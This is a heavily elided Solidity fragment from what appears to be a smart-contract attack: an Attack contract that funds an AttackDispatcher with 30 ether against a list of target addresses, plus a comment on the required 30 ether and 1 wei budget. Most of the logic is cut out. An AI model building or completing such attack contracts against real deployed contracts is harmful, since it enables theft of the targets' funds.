 ...
 * parameter. Make sure to send at least 30 ether and 1 wei to the attack
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 4) {
                ...
                uint value = 0x1a055690d9db80000;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x1a055690d9db80001; /* equals 30 ether and 1 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[4] = new AttackDispatcher{value: 30000000000000000000 }(4, _targets);
    }
